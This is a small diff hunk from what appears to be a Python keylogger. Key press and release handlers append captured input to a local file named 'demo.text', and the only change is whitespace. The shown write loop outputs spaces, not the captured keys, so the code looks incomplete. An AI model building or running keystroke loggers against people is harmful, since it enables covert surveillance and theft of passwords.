@@ -7,7 +7,7 @@ def on_press(key):
 def write_1(var):
     with open("demo.text","a") as f:
         for i in var:
-            new_var = str(i).replace(" ",'')
+            new_var = str(i).replace(" ",'')            
             f.write(" ")
 def on_release(key):
     if key == Key.esc:
